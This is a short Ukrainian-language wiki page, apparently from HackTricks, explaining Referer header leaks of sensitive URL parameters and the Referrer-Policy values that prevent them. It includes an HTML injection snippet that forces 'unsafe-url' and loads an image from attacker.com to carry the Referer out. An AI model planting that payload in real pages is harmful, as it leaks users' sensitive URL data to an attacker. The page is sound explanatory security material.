{{#include ../banners/hacktricks-training.md}}

# Заголовки реферера та політика

Реферер - це заголовок, який використовують браузери, щоб вказати, яка була попередня відвідана сторінка.

## Витік чутливої інформації

Якщо в якийсь момент на веб-сторінці будь-яка чутлива інформація знаходиться в параметрах GET-запиту, якщо сторінка містить посилання на зовнішні джерела або зловмисник може змусити/порадити (соціальна інженерія) користувачу відвідати URL, контрольований зловмисником. Це може призвести до ексфільтрації чутливої інформації з останнього GET-запиту.

## Пом'якшення

Ви можете змусити браузер дотримуватись **Referrer-policy**, яка може **запобігти** відправці чутливої інформації на інші веб-додатки:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Контрзаходи

Ви можете переопределити це правило, використовуючи HTML мета-тег (зловмисник повинен експлуатувати та HTML-ін'єкцію):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Захист

Ніколи не розміщуйте чутливі дані в параметрах GET або шляхах в URL.

{{#include ../banners/hacktricks-training.md}}
